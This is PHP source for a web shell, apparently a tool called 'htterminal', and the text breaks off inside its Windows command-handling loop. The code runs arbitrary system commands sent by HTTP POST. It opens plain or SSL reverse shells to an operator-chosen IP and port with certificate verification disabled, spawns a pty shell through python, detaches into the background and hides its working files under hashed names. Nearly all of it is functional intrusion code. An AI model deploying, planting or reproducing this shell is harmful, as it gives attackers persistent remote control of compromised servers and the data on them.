<?php


$debug=false;//Debug php codes and save errors to logs.txt

$inputfile=$outputfile=$timerfile=$pidfile=$SIGKILLfile=$ClientLastConnectionfile=$Shell_Mode_file=$CCD_file="";
/*I dont set this variables values here as md5 function is included for that.
An unauthorized bad guy may use it for a DDOS attack! :)
*/

$Passwordfile=".password.".HashMD5("anti-lfi");//File to store password hash


/*
 Set curernt directory to a writable path.[current driectory or upload temp directory or system temp directory]
 on Linux:/tmp
 on windows:C:\Windows\Temp
 */

$writable_dir='';
$systmpdir=@sys_get_temp_dir();
$upload_tmp=@ini_get('upload_tmp_dir');
$cwd=@getcwd();

if(is_dir($cwd) && is_writable($cwd)){
    $writable_dir=$cwd;
}else if(is_dir($upload_tmp) && is_writable($upload_tmp)){
    $writable_dir=$upload_tmp;
}else if(is_dir($systmpdir) && is_writable($systmpdir)){
    $writable_dir=$systmpdir;
}else{
	die("Error:Could not find a writable directory!");
}



chdir($writable_dir); //Set current directory to the writable directory

$SettingsFolder="htterminal";//Create settings folder...
is_dir($SettingsFolder) || @mkdir($SettingsFolder);//Create $SettingsFolder if not exists.

$writable_dir.=DIRECTORY_SEPARATOR.$SettingsFolder;
chdir($writable_dir); //Set current directory to the htterminal directory



$OS_Version=php_uname();//Get Operation System version
$User=get_current_user();//Get username owning this php script

$OS='';
if (DIRECTORY_SEPARATOR == '/'){//Detect What's Server Operation System --> Windows or Unix_based OS
    $OS='unix-linux-mac';
}else if (DIRECTORY_SEPARATOR == '\\'){
    $OS='windows';
    
}



$salt=getcwd().$OS_Version.$User.phpversion();//(current directory+OS version version+user+php version) as hashing salt




// Remove any umask we inherited
umask(0);



function TestShell(){//check shell/cmd isn't /bin/false ,/bin/nologin or disabled
$test=trim(@SysExec("echo 1234",true));
if($test!="1234"){
LogTXT("Warning:command-line isn't available!You can't execute system commands! :(\n\n");	
}
}


function ChangeShellMode(){//Function To change Shell Mode and save it to $Shell_Mode_file
    //values for $Shell_Mode are "proc_open" and "command_only"
    global $Shell_Mode;
    global $Shell_Mode_file;
    
    if(FuncAvailable("proc_open")==false){//mode was set to command_only,warn that proc_open is not available and user can't change mode to "proc_open"
        LogTXT("proc_open is disabled and mode is command-only.You can't change your shell mode.\n");
        die();
    }else{//both of proc_open and command_only modes are available.switch shell mode and save it to $Shell_Mode_file
        
        //if proc_open > command_only
        //if command_only > proc_open
        
        if(file_exists($Shell_Mode_file)){
            
            $val=file_get_contents($Shell_Mode_file);
            // if proc_open > command_only,send sigkill to kill sh/cmd.exe process
            if($val=="proc_open"){//Tell user mode was changed
                $Shell_Mode="command_only";
                file_put_contents($Shell_Mode_file,$Shell_Mode);
                LogTXT("Shell mode changed to command_only mode\n");
                //SendSIGKILL();
            }else{
                $Shell_Mode="proc_open";
                file_put_contents($Shell_Mode_file,$Shell_Mode);
                LogTXT("Shell mode changed to proc_open mode\n");
            }
            
        }
        
    }
    die();
}



function SetDefaultShellMode($EchoMode){//Function to set Shell Mode.checks $Shell_Mode_file for choosen shell mode if $Shell_Mode_file not exists choose the best choice
    global $Shell_Mode_file;                //if $EchoMode is true;tell user what shell mode is choosen.
    global $Shell_Mode;
    
    if(file_exists($Shell_Mode_file)){//$Shell_Mode_file exists,Read shell mode from file
        
        $val=file_get_contents($Shell_Mode_file);
        //Choose proc_open or command_only from saved file
        if($val=="proc_open"){$Shell_Mode="proc_open";if($EchoMode){LogTXT("Shell mode is proc_open mode\n");}}else{$Shell_Mode="command_only";if($EchoMode){LogTXT("Shell mode is command_only mode\n");}}
        
    }else{//No shell mode settings is saved.Use proc_open as default if proc_open not available use command_only mode
        
        if(FuncAvailable("proc_open")){//proc_open is available
            
            //proc_open  available,use proc_open mode and save shell mode to $Shell_Mode_file
            $Shell_Mode="proc_open";
            file_put_contents($Shell_Mode_file,$Shell_Mode);
            if($EchoMode){LogTXT("Shell mode is proc_open mode\n");}
            
        }else{//proc_open not available,use command_only mode and save shell mode to $Shell_Mode_file
            
            $Shell_Mode="command_only";
            file_put_contents($Shell_Mode_file,$Shell_Mode);
            if($EchoMode){LogTXT("Shell mode is command_only mode\n");}
            
        }
    }
    
    
    
}


function cwd(){

global $CCD_file;
SetDefaultShellMode(false);
global $Shell_Mode;	
global $writable_dir;



if(file_exists($CCD_file)){
	
$dir=trim(file_get_contents($CCD_file));

chdir($dir);
$dir=getcwd();
chdir($writable_dir);
return("Current directory is:$dir\n");	

}else{
return("Current directory is:$writable_dir\n");	
}



	
}

function CCD($dir){
	
global $CCD_file;
SetDefaultShellMode(false);
global $Shell_Mode;
global $writable_dir;


if(trim($dir)!=""){//Set current working directory for command-only shell mode



	
	if(file_exists($CCD_file)){
		$LastDir=trim(file_get_contents($CCD_file));
		chdir($LastDir);
	}
	

	
    
    
$path=realpath(trim($dir));    
	
if($path!==false && is_dir($path)){//Valid path

chdir($path);
$path=getcwd();
chdir($writable_dir);
file_put_contents($CCD_file,$path);
return("Current directory changed to:$path\n");	
	
}else{//No valid directory
	chdir($writable_dir);
	return("$dir is not a valid directory.\n");
	
}
return 0;
}	

}


	

function FuncAvailable($func) {//Function to check is a function available or not.some functions may be disabled by administrator.We check it to choose the alternatives
    if (in_array(strtolower(ini_get('safe_mode')), array('on', '1'), true) || (!function_exists($func))) {
        return false;
    }
    $disabled_functions = explode(',', ini_get('disable_functions'));
    $enabled = !in_array($func, $disabled_functions);
    return ($enabled) ? true : false;
}




function SysExec($cmd,$WannaOutput){//Function check system,exec,shell_exec,proc_open,passthru and choose one of them to execute a command
    //if $WannaOutput is true,return command of output else return nothing
    global $writable_dir;
	$tmp=$writable_dir.DIRECTORY_SEPARATOR.".tmp";
    
    //We write commands output to "tmp" file,read it's value to $res,delete "tmp" file then return $res if $WannaOutput is true
    
    if(FuncAvailable("system")){
        if($WannaOutput){$cmd.=" > $tmp";}
        
        
        system($cmd);
        if($WannaOutput){
            $res=file_get_contents("$tmp");
            unlink("$tmp");
            return $res;
        }else{
            return true;
        }
        
        
        
    }elseif(FuncAvailable("shell_exec")){
        $o=shell_exec($cmd);
        if($WannaOutput){return $o;}else{return true;}
        
        
    }elseif(FuncAvailable("exec")){
        
        if($WannaOutput){$cmd.=" > $tmp";}
        
        exec($cmd);
        if($WannaOutput){
            $res=file_get_contents("$tmp");
            unlink("$tmp");
            return $res;
        }else{
            return true;
        }
        
    }elseif(FuncAvailable("passthru")){
        if($WannaOutput){$cmd.=" > $tmp";}
        
        passthru($cmd);
        if($WannaOutput){
            $res=file_get_contents("$tmp");
            unlink("$tmp");
            return $res;
        }else{
            return true;
        }
        
        
    }elseif(FuncAvailable("proc_open")){
        if($WannaOutput){$cmd.=" > $tmp";}
        
        
        proc_close(proc_open($cmd,array(),$test));
        if($WannaOutput){
            $res=file_get_contents("$tmp");
            unlink("$tmp");
            return $res;
        }else{
            return true;
        }
        
        
    }else{
        return false;
    }
    
}




function SendSIGKILL(){//Function to send a SIGKILL message by creating $SIGKILLfile file
    global $SIGKILLfile;
    file_put_contents($SIGKILLfile,"");
}









function SendSTDIN(){//Function to handle stdin comming from user
    
    
    SetDefaultShellMode(false);//Load choosen Shell mode
    global $Shell_Mode;
    
       global $ClientLastConnectionfile;
       touch($ClientLastConnectionfile);//Log clients last http request date and time by changing $ClientLastConnectionfile file,means client is online now
            
    
    if($Shell_Mode=="proc_open"){//Shell mode is proc_open,We check that (sh/cmd) process is running or not
        
        global $OS;
        global $timerfile;
        global $pidfile;
 
        if($OS!="windows"){
            $msg="Error: Shell Process Not Running.send \"start\" or \"rv\" command\n";
        }else{
            $msg="Error: cmd.exe Not Running.send \"start\" or \"rv\" command\n";
        }
        
        if(file_exists($timerfile)){//If timer file exists,Check date is old or new,if old means process in not running
            clearstatcache();//Clear stat cache to prevent wrong date and times
            
            $seconds=time()-filemtime($timerfile);
            if(3<$seconds){//More than 4 seconds,(sh/cmd) Process is not running,warn user
                LogTXT($msg);//Process is not running
                die();
            }
        }else{//If timer file doesn't exist => (sh/cmd) Process is not running
            LogTXT($msg);//warn user
            die();
        }
        
        
        if(file_exists($pidfile)){//If $pidfile exists,read pid and check is alive or not
            $pid=file_get_contents($pidfile);
            if($pid!=""){
                
                if($OS!="windows"){//On Linux/mac/unix
                    
                    if(!file_exists("/proc/".$pid)){//pid in not alive,Warn user that sh process is nor running
                        LogTXT($msg);//warn user
                    }
                    
                }else{//On Windows
                    
                    if(!IsCMDProcessRunning()){//If file $CMD_out is not locked means cmd.exe is not running
                        LogTXT($msg);//warn user,cmd.exe is not running
                        die();
                    }
                    
                    
                }
                
                
                
            }
        }
        
        
        
        
        
        
        
        
        $stdin=$_POST['c'];//Yes! (cmd.exe/sh) process is running and we can send our input to it by putting it in $inputfile,input is command+NewLine
        global $inputfile;
        file_put_contents($inputfile,$stdin);
        
        
    }else{//Shell mode is command_only,We don't send our input to (cmd.exe/sh) process.We execute them directly and Log output for the user
        
        
        set_time_limit(0);//Set execution limit to 0
        $stdin=trim($_POST['c']);//trim input (delete newline characters) to avoid broken commands
		
		//Set current directory from ccd file;
		global $CCD_file;
		if(file_exists($CCD_file)){chdir(trim(file_get_contents($CCD_file)));}
		
        $output=SysExec($stdin,true);//	execute command by SysExec and get it's output
      
    	global $writable_dir;//After executing command change current working directory to what it was.
		chdir($writable_dir);
		
        if(trim($stdin)!=""){
            LogTXT("$stdin\n$output>");//Log input and output for the user in a nice format
        }else{
            LogTXT("\n>");//Log input and output for the user in a nice format
        }
        
        
        
    }
    
}







function LogTXT($txt){
    /*Function Logs texts to $outputfile,Many of other functions uses this function to save their output to $outputfile,
     ReadTXT function reads $outputfile and prints texts to the browser
     */
    global $outputfile;
    file_put_contents($outputfile,$txt,FILE_APPEND);//append new texts to $outputfile
}


function ReadTXT(){//Function reads $outputfile to the browser
    global $outputfile;
    global $ClientLastConnectionfile;
    touch($ClientLastConnectionfile);//Log clients last http request date and time by changing $ClientLastConnectionfile file,means client is online now

    if(file_exists($outputfile)){//if $outputfile exists read it,print it's value to browser,delete it

        $val=file_get_contents($outputfile);
        @unlink($outputfile);
        die($val);
    }
    
}



function KillProcess($pid){//Cross-OS function for Killing processes by their PID
    global $OS;
    
    if ($OS=='unix-linux-mac'){//OS is unix
        
        SysExec("kill -9 $pid &",false);
        
    }else{//OS is Windows
        SysExec("START /B TASKKILL /F /T /PID $pid",false);
    }
    
    
}


function IsCMDProcessRunning(){//Function to check that cmd.exe is running or not on Windows
    global $CMD_out;
    if(!file_exists($CMD_out)){//If $CMD_out not exists means cmd.exe not running
        return false;
    }else{
        
        
        if(@is_writable($CMD_out)){
            
            if(@unlink($CMD_out)){//If we are unable to delete $CMD_out file it maens that cmd.exe opened it and cmd.exe is running
                return false;
            }else{
                return true;
            }
            
        }else{
            return false;
        }
        
    }
}



function StartShell($mode,$ip="",$port=""){//The main function handles shell processes or creates reverse shells,...
    
    set_time_limit(0);//Set execution limit to 0
    
    /*Communication Modes are:
     1-local ==> no socket connection,write/read files
     2-socket ==> socket reverse shell
     3-ssl ==> ssl socket reverse shell
     */
    
	global $inputfile;
	global $outputfile;
	global $timerfile;
	global $pidfile;
	global $SIGKILLfile;
	global $ClientLastConnectionfile;
	global $Shell_Mode_file;
	global $Shell_Mode;
	global $CCD_file; 
	global $Welcome_message;
	global $OS_Version;
	global $User;
    global $OS;
	global $CMD_out;
	global $CMD_err;
    
    if (PHP_SAPI!='cli'){//Script is running from Web Server,Close HTTP connection and process in background

		
		
        ignore_user_abort(true);
        ob_start();
        header('Connection: close');//Close HTTP connection
        header('Content-Length: '.ob_get_length());
        ob_end_flush();
        ob_flush();
        flush();
        
    }else{//CLI
		

	

	
	$Welcome_message="\nOperation System:$OS_Version\nUser:$User\n\n";
	
	$inputfile=".in.".HashMD5("anti-lfi");//File to store stdin input
    $outputfile=".out.".HashMD5("anti-lfi");//File to store process and script output
    $timerfile=".timer.".HashMD5("anti-lfi");//File to store the last date process was active
    $pidfile=".pid.".HashMD5("anti-lfi");//File to store pid of created process
    $SIGKILLfile=".SIGKILL.".HashMD5("anti-lfi");//file to ask killing process by creating it
    $ClientLastConnectionfile=".CLast.".HashMD5("anti-lfi");//File to store last date client visited the page
    $Shell_Mode_file=".mode.".HashMD5("anti-lfi");//File to save shell mode,Use proc_open for run-time shell or use SysExec for just executing commands
    $Shell_Mode='';
    $CCD_file='.ccd.'.HashMD5("anti-lfi");//File to save current directory choosen for shell mode
	
	//------------
	//Files to hanld CMD.exe stout and stderr on Windows
	if($OS=='windows'){
	  $CMD_out="results.".HashMD5("anti-lfi");
	  $CMD_err="error.".HashMD5("anti-lfi");		
	}
   //------------
	
	
	if(file_exists($outputfile)){@unlink($outputfile);}
    if(file_exists($inputfile)){@unlink($inputfile);}	
		
	}
    //Get current directory from ccd file;
	if(file_exists($CCD_file)){$dir=(trim(file_get_contents($CCD_file)));}else{$dir=getcwd();}
	

	
	
	
	
	
    $errno=""; //Handle socket errors
    $errstr="";                                                               //Here we create a socket and connect to ip:port if Communication mode is socket/ssl
    $sock=null;//$sock will not be null if socket created
    
    if($mode=="socket"){//Create simple socket
        $ip=gethostbyname($ip);//Convert hostname to ip address
        $sock = fsockopen($ip, $port, $errno, $errstr, 50);//connect to ip:port,timeout 50 seconds
    }elseif($mode=="ssl"){
        $context = stream_context_create(['ssl' => ['verify_peer' => false,'verify_peer_name' => false]]);//SSL settings
        $ip=gethostbyname($ip);//Convert hostname to ip address
        $sock = stream_socket_client("ssl://$ip:$port", $errno, $errstr,50, STREAM_CLIENT_CONNECT, $context);//connect to ip:port,timeout 50 seconds,ssl
    }
    
    if($mode!="local"){//if Communication mode is socket/ssl...
        if(!$sock) {//Creating socket failed
            LogTXT("Connecting to $ip:$port got error:$errstr($errno)\n");//tell user creating socket failed
            die();
        }else{//sucessfully connected!
            LogTXT("Connected to $ip:$port successfully for reverse shell\n");//tell user creating socket successed
            stream_set_blocking($sock, 0);//Set socket non-blocking to prevent crashes.
        }
    }
    
    
    
    $chunk_size = 3000;//Size to read from socket and pipes
    
    
    
    
    SetDefaultShellMode(false);//Load shell mode
    global $Shell_Mode;
    
    
    if($Shell_Mode!="proc_open"){//We don't use proc_open,using SysExec(),command_only mode...
        
        //write command_only shell mode messages to socket,Local communication mode for command_only shell mode is not handled here,It's handled in PreStartShell() function
        

		
		
		$msg="\n\nThis PHP file path:".__FILE__."\nCurrent working directory:".$dir."\n";if(!is_null($sock)){fwrite($sock,$msg);}
        $msg="Warning:shell mode is command_only.\nYou can't get run-time outputs or read stderr\n";if(!is_null($sock)){fwrite($sock,$msg);}
        $msg=$Welcome_message;if(!is_null($sock)){fwrite($sock,$msg);}
        $msg="You can use \"cwd\" to get current working directory,\"ccd\" to change current working directory,\"exit\" or \"quit\" commands to exit the shell.\n>";if(!is_null($sock)){fwrite($sock,$msg);}
        
        
        while(1){//Handle reverse shell in command_only mode
            
			
			global $ClientLastConnectionfile;
            touch($ClientLastConnectionfile);//Log clients last http request date and time by changing $ClientLastConnectionfile file,means client is online now
			
			
            if(feof($sock)){//If socket is closed,Warn user and exit loop
                LogTXT("ERROR: Reverse Shell connection to $ip:$port was terminated\n");
                break;
            }
            
            
            $inp=fread($sock,$chunk_size);//Read socket to $inp
            
            
            
            if(trim($inp)!=""){//If $inp is not empty,Handle the input,if it's "exit" or "quit" close the connection else execute it as command and get the output
                
                if(trim($inp)=="exit" || trim($inp)=="quit"){break;}//if socket $inp is exit or quit means user asked to close the connection,exit loop
                
				if (strpos(trim($inp),"ccd ") === 0) {//Handle ccd and cwd commands
                $dir=substr(trim($inp),4);
				fwrite($sock,CCD($dir));   
				global $CCD_file;
		        if(file_exists($CCD_file)){chdir(trim(file_get_contents($CCD_file)));}
				
                }elseif(trim($inp)=="cwd"){
					
				fwrite($sock,cwd().">"); 
				
				}else{//Execute command
				
                $out=SysExec(trim($inp),true);//Execute command and get it's output we use trim to prevent broken commands
                
				global $writable_dir;//After executing command change current working directory to what it was.
		        chdir($writable_dir);
               
			   if(trim($out)!=""){//If output isn't empy...
                    
                    fwrite($sock,">$inp\n$out");//write output to socket in command-line style
                    
                }elseif($out=="\n"){//If Output is newline
                    
                    fwrite($sock,"\n");//write newline to socket in command-line style
                    
                }
				
					
				}
                
                
                
                
            }elseif($inp=="\n"){//input is newline,write nothing to socket in command-line style
                fwrite($sock,">");
            }
            
            
            
            
        }//Exited loop
        fclose($sock);//Close socket
        LogTXT("Reverse Shell connection to $ip:$port closed\n");//tell user connection was closed
        die();//Exit PHP codes
    }
    
    //We reached here,$Shell_Mode is "proc_open" as we didn't Die on above codes!
    //Start (cmd.exe/sh) process as shell mode is proc_open...
    
    if ($OS=='unix-linux-mac'){//OS is unix.Start /bin/sh and handle it
        
        
        if (function_exists('pcntl_fork')) {                           //Do forking process on Unix,if Failed Warn the user....
            $pid = pcntl_fork();                                       //Thanks for http://pentestmonkey.net/tools/web-shells/php-reverse-shell
            if ($pid == -1) {
                LogTXT("ERROR: Can't fork\n");
                exit(1);
            }
            
            if($pid){
                exit(0);// Parent exits
            }
            
            
            if (posix_setsid() == -1) {
                LogTXT("Error: Can't setsid()\n");
                exit(1);
            }
            
        }else{
            LogTXT("WARNING: Failed to daemonise.  This is quite common and not fatal.\n");
        }
        
        
        
        
        if(file_exists($timerfile)){                                                     //Handle possible old process in Unix
            $seconds=time()-filemtime($timerfile);
            if($seconds<=3){//Process is new.Warn Process is running.
                $msg="ERROR: shell process already is running\n";
                if(!is_null($sock)){fwrite($sock,$msg);fclose($sock);LogTXT("Reverse Shell connection to $ip:$port closed\n");}else{LogTXT($msg);}
                die();
                
            }
        }
            
        
            //kill possible old process
            if(file_exists($pidfile)){
                $pid=file_get_contents($pidfile);
                if($pid!=""){
                    
                    if(file_exists("/proc/".$pid)){
                        
                        if(file_exists($inputfile)){unlink($inputfile);}
                        if(file_exists($outputfile)){unlink($outputfile);}
                        if(file_exists($timerfile)){unlink($timerfile);}
                        if(file_exists($pidfile)){unlink($pidfile);}
                        if(file_exists($SIGKILLfile)){unlink($SIGKILLfile);}
                        KillProcess($pid);
                    }//Send Sigkill
                }
            }
            
            
            
            
            $descriptorspec = array(// descriptors for Unix based process
                0 => array("pipe", "r"),//stdin
                1 => array("pipe", "w"),//stdout
                2 => array("pipe", "w")//stderr
            );
            
            /*
             we check that is python available?
             if we execute below command we will have a pty shell ==> being able to use some commands like "sudo"
             /usr/bin/python2 -c 'import pty; pty.spawn("/bin/sh")'
             
             */
            $shell ="/usr/bin/python2 -c 'import pty; pty.spawn(\"/bin/sh\")'";
            
            $process = proc_open($shell, $descriptorspec, $pipes,$dir);//Try opening python...
            
            
            $msg='';
            if (!is_resource($process)) {//Failed to use python,lost pty! message client and let's try /bin/sh
                $msg="Error: Can not Use Python.You can't handle tty.Trying /bin/sh...\n";if(!is_null($sock)){fwrite($sock,$msg);}else{LogTXT($msg);}
                $shell ="/bin/sh";
                $process = proc_open($shell, $descriptorspec, $pipes,$dir);//Try opening /bin/sh...
                if (!is_resource($process)) {//Failed to use /bin/sh,lost shell! message client that we can't have a shell access!
                    $msg="Error: Failed To access /bin/sh.\n";if(!is_null($sock)){fwrite($sock,$msg);}else{LogTXT($msg);}
                    die();
                }else{//  /bin/sh opened successfully
                    $msg="Ok:Used /bin/sh to create shell.use expect to handle tty\n";if(!is_null($sock)){fwrite($sock,$msg);}else{LogTXT($msg);}
                    
                    $s=proc_get_status($process);
                    $pid=$s['pid']+1;                  //Save /bin/sh pid to $pid file
                    file_put_contents($pidfile,$pid);
                    
                    
                }
            }else{//  python opened successfully
                $msg="Ok:Used python to create shell\n";if(!is_null($sock)){fwrite($sock,$msg);}else{LogTXT($msg);}
                $s=proc_get_status($process);
                $pid=$s['pid']+1;                  //Save python pid to $pid file
                file_put_contents($pidfile,$pid);
                
                
            }
            
            
            //Shell is opened!It's time to handle it:
            
            
            stream_set_blocking($pipes[0], 0); //Make stdin,stdout & stderr non-blocking.We can't do this on Windows!
            stream_set_blocking($pipes[1], 0);
            stream_set_blocking($pipes[2], 0);
            
			
			
            
            //Send Hello message to client
            $msg="\n\nThis PHP file path:".__FILE__."\nCurrent working directory:".$dir."\n";if(!is_null($sock)){fwrite($sock,$msg);}else{LogTXT($msg);}
            $msg=$Welcome_message;if(!is_null($sock)){fwrite($sock,$msg);}else{LogTXT($msg);}
            
            //While process is running handle it...
            
            while(1){//Start While
                
                
                
                
                clearstatcache();//Clear stat cache to get correct data
                
                
                //Update Timer file
                touch($timerfile);
                
                
                
                
                if(feof($pipes[1])) {//Check stdout pipe is open else tell client process is closed and exit While loop
                    $msg="ERROR: Shell process terminated\n";if(!is_null($sock)){fwrite($sock,$msg);}else{LogTXT($msg);}
                    break;
                }
                
                
                
                if(!is_null($sock)){//If socket is created...
                    
                    if(feof($sock)) {//Check stdout pipe is open else tell user socket is closed and exit While loop
                        LogTXT("ERROR: Reverse Shell connection to $ip:$port was terminated\n");
                        break;
                    }else{
                        touch($ClientLastConnectionfile);//Log that client is online
                    }
                }
                
                
                
                $read_a = array($pipes[1], $pipes[2]);//Pass stdout & stderr to the $read_a array
                
                
                if(!is_null($sock)){//If socket is created pass in to $read_a too
                    
                    array_push($read_a,$sock);
                    
                }else{//Read value for stdin from $inputfile and pass it to stdin pipe
                    
                    
                    if(file_exists($inputfile)) {//Check if $inputfile file is available(containing stdin client have sent)
                        $val=file_get_contents($inputfile);//read $inputfile to $val
                        fwrite($pipes[0],$val); //write stdin to pipe and delete $inputfile
                        unlink($inputfile);
                        
                        
                    }
                    
                    
                }
                
                
                
                
                
                
                
                if(file_exists($ClientLastConnectionfile)){//Update Timer Client file,means client is online now
                    clearstatcache();//Clear stat cache to get correct data
                    $seconds=time()-filemtime($ClientLastConnectionfile);//Duration of the last client communication
                    
                    if(60<$seconds){//If the last client communication was a minute ago ==> exit session
                        
                        if(file_exists($SIGKILLfile)){unlink($SIGKILLfile);}//Delete input,output,signal,timer,client last communication files...
                        if(file_exists($inputfile)){unlink($inputfile);}
                        if(file_exists($outputfile)){unlink($outputfile);}
                        if(file_exists($timerfile)){unlink($timerfile);}
                        if(file_exists($ClientLastConnectionfile)){unlink($ClientLastConnectionfile);}
                        
                        
                        
                        if(file_exists($pidfile)){//If pid file exists...
                            
                            
                            $pid=file_get_contents($pidfile);//Get pid from file
                            
                            if($pid!=""){//if pid isn't empty...
                                
                                if(file_exists("/proc/".$pid)){//if pid is pid of a running process ==> that process is our shell process kill it!
                                    KillProcess($pid);
                                }
                                
                            }
                            
                            
                            unlink($pidfile);//Delete pid file
                        }
                        
                        break;//Exit loop
                        // die();//
                    }
                    
                }
                
                
                
                
                if(file_exists($SIGKILLfile)) {//If we have recieved a sigkill request from client,...
                    unlink($SIGKILLfile);//Delete sigkill file
                    if(file_exists($inputfile)){unlink($inputfile);}//Delete input,output,signal,timer files
                    if(file_exists($outputfile)){unlink($outputfile);}
                    if(file_exists($timerfile)){unlink($timerfile);}
                    
                    if(file_exists($pidfile)){//If pid file exists...
                        
                        $pid=file_get_contents($pidfile);//Get pid from file
                        if($pid!=""){//if pid isn't empty...
                            
                            if(file_exists("/proc/".$pid)){
                                KillProcess($pid);//if pid is pid of a running process ==> that process is our shell process kill it!
                            }
                            
                        }
                        unlink($pidfile);//Delete pid file
                    }
                    //message to client that sigkill was successfully recieved!
                    $msg="Shell process killed\n";if(!is_null($sock)){fwrite($sock,$msg);}else{LogTXT($msg);}
                    break;
                    
                }
                
                
                
                if (in_array($pipes[1], $read_a)) {//Read process stdout and send it to client by LogTXT() or socket
                    $out = fread($pipes[1], $chunk_size);
                    touch($ClientLastConnectionfile);//Log that client is online
                    if($out!=""){if(!is_null($sock)){fwrite($sock,$out);}else{LogTXT($out);}}
                    
                }
                
                if (in_array($pipes[2], $read_a)) {//Read process stderr and send it to client by LogTXT() or socket
                    $out = fread($pipes[2], $chunk_size);
                    touch($ClientLastConnectionfile);//Log that client is online
                    if($out!=""){if(!is_null($sock)){fwrite($sock,$out);}else{LogTXT($out);}}
                }
                
                
                if(!is_null($sock)){//Read socket if created and send it stdin pipe
                    if (in_array($sock, $read_a)) {
                        $in = fread($sock, $chunk_size);
                        touch($ClientLastConnectionfile);//Log that client is online
                        if($in!=""){fwrite($pipes[0],$in);}
                        
                    }
                }
                
                
                
                
            }//End While
            //Now Process is dead!
            fclose($pipes[0]);//Close stdin pipe
            fclose($pipes[1]);//Close stdout pipe
            fclose($pipes[2]);//Close stderr pipe
            
            if(!is_null($sock)){//If socket is created,close it
                fclose($sock);LogTXT("Reverse Shell connection to $ip:$port closed\n");
            }
            
            proc_close($process);//Close process
            die();//End
            
            
            
            
            
            
    }else{//OS is Windows.Start CMD.exe and handle it
        
        global $CMD_out;
        global $CMD_err;
        
        /*
         What here?
         if operation system is Windows we can't use non_blocking streams as it get hanged.Also we can't read Pipes/socket at once!
         Also if we redirect both stdout and stderr to the same file the ouput gets corrupted.
         I solved the problem by doing:
         Redirect stdout to $CMD_out
         Redirect stderr to $CMD_err
         We will not be able to write $CMD_out,$CMD_err as are opened by cmd.exe,we read them and combine to the main result file($outputfile).
         We check size of $CMD_out,$CMD_err if there was new texts we read them and appen to $CMD_out,$CMD_err
         */
        
        
        if(file_exists($timerfile)){                                                     //Handle possible old process in Unix
            $seconds=time()-filemtime($timerfile);
            if($seconds<=3){//Process is new
                $msg="cmd.exe process already is running\n";
                if(!is_null($sock)){fwrite($sock,$msg);fclose($sock);LogTXT("Reverse Shell connection to $ip:$port closed\n");}else{LogTXT($msg);}
                die();
                
            }}//Process is killed and need to be renewed.
            
            
            
            //kill possible last process
            if(file_exists($pidfile)){
                $pid=file_get_contents($pidfile);
                if($pid!=""){
                    
                    if(file_exists($inputfile)){unlink($inputfile);}
                    if(file_exists($outputfile)){unlink($outputfile);}
                    if(file_exists($timerfile)){unlink($timerfile);}
                    if(file_exists($pidfile)){unlink($pidfile);}
                    if(file_exists($SIGKILLfile)){unlink($SIGKILLfile);}
                    KillProcess($pid);
                    //Send Sigkill
                }
            }
            
            
            
            
            if(IsCMDProcessRunning()){
                $msg="cmd.exe process already is running";if(!is_null($sock)){fwrite($sock,$msg);}else{LogTXT($msg);}
                die();
            }
            
            
            $descriptorspec = array(                                    //CMD.exe descriptors
                0 => array('pipe', 'r'), // stdin
                1 => array('file',$CMD_out, "w"), // stdout
                2 => array('file',$CMD_err, "w") // stderr
            );
            
            
            $process = proc_open("start /b cmd.exe", $descriptorspec, $pipes,$dir); //Start cmd.exe
            
            if(is_resource($process)){//Check if cmd.exe opened successfully
                $ppid = proc_get_status($process)['pid'];
                //system("wmic process get parentprocessid,processid | find \"$ppid\" > tmp");
                $txt=SysExec("wmic process get parentprocessid,processid | find \"$ppid\"",true);
				
                $output = array_filter(explode(" ",$txt));//Get real process id with wmic query(may get problem on older versions of Windows...

                array_pop($output);
                $pid = end($output);
                
                file_put_contents($pidfile,$pid);//Save PID to pid file
                
                stream_set_blocking($pipes[0], 0);//Set stdin non_blocking to write it.(others can't be non_blocking as we get problem)
                
                
                $msg="Ok:Used cmd.exe to create shell\n";if(!is_null($sock)){fwrite($sock,$msg);}else{LogTXT($msg);}
                
				

				
				
                //Send Hello message to client
                $msg="\n\nThis PHP file path:".__FILE__."\nCurrent working directory:".$dir."\n";if(!is_null($sock)){fwrite($sock,$msg);}else{LogTXT($msg);}
                global $Welcome_message;
                $msg=$Welcome_message;if(!is_null($sock)){fwrite($sock,$msg);}else{LogTXT($msg);}
                
                
                $size=0;
                $size2=0;
                
                while(1){//While process (cmd.exe) is running handle it...
                    
                    
                    
                    
                    
                    
                    
                    
                    if(!IsCMDProcessRunning()){
                        $msg="ERROR: cmd.exe process terminated\n";
                        if(!is_null($sock)){fwrite($sock,$msg);fclose($sock);LogTXT("Reverse Shell connection to $ip:$port closed\n");}else{LogTXT($msg);}
                        break;
                    }
                    
                    
                    
                    if(file_exists($SIGKILLfile)) {//If we have recieved a sigkill request from client,...             //Handle Sigkill
                        @unlink($SIGKILLfile);//Delete sigkill file
                        if(file_exists($inputfile)){@unlink($inputfile);}//Delete input,output,signal,timer files
                        if(file_exists($outputfile)){@unlink($outputfile);}
                        if(file_exists($timerfile)){@unlink($timerfile);}
                        if(file_exists($pidfile)){//If pid file exists...
                            
                            $pid=file_get_contents($pidfile);//Get pid from file
                            if($pid!=""){//if pid isn't empty...
                                
                                
                                KillProcess($pid);
                                
                                
                            }
                            unlink($pidfile);//Delete pid file
                        }
                        
                        
                        //message to client that sigkill was successfully recieved!
                        $msg="cmd.exe process killed\n";if(!is_null($sock)){fwrite($sock,$msg);}else{LogTXT($msg);}
                        break;
                        
                    }
                    
                    
                    
                    
                    
                    if(file_exists($ClientLastConnectionfile)){//Update Timer Client file,means client is online now
                        $seconds=time()-filemtime($ClientLastConnectionfile);//Duration of the last client communication
                        
                        if(60<$seconds){//If the last client communication was a minute ago ==> exit session
                            
                            if(file_exists($SIGKILLfile)){unlink($SIGKILLfile);}//Delete input,output,signal,timer,client last communication files...
                            if(file_exists($inputfile)){unlink($inputfile);}
                            if(file_exists($outputfile)){unlink($outputfile);}
                            if(file_exists($ClientLastConnectionfile)){unlink($ClientLastConnectionfile);}
                            if(file_exists($timerfile)){@unlink($timerfile);}
                            if(file_exists($pidfile)){//If pid file exists...
                                
                                $pid=file_get_contents($pidfile);//Get pid from file
                                if($pid!=""){//if pid isn't empty...
                                    
                                    
                                    KillProcess($pid);
                                    
                                    
                                }
                                unlink($pidfile);//Delete pid file
                            }
                            
                            
                            
                            break;//Exit loop
                            // die();//
                        }
                        
                    }
                    
                    
                    
                    
                    clearstatcache();//Clear stat cache to get correct data
                    
                    
                    //Update Timer file
                    touch($timerfile);
                    
                    
                    if(!is_null($sock)){//If socket is created.check it and read it
                        
